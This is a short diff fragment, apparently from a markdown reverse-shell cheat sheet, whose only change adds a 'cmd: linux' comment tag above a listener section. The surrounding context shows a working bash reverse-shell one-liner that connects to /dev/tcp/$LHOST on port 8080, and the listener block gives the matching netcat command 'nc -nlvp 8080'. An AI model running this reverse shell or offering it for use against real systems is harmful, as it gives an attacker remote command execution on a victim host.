@@ -14,6 +14,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/8080 0>&1'");
 
 ## Listener
 
+<!-- cmd: linux -->
 ```bash
 nc -nlvp 8080
 ```
